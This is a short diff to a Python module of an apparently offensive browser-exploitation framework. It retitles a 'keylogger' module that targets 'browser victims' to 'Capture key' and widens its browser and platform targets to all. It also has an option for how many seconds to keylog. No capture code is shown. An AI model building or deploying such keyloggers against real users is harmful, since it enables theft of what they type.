@@ -5,9 +5,9 @@ class Module(BrowserAuxiliary):
 
 	__info__ = {
 		"name": "keylogger",
-		"description": "Execute alert on browser victim",
-		"browser": Browser.GENERIC,
-		"platform": Platform.GENERIC
+		"description": "Capture key",
+		"browser": Browser.ALL,
+		"platform": Platform.ALL
 	}	
 	
 	time_active = OptInteger(10, "Number of seconds to keylog", True)
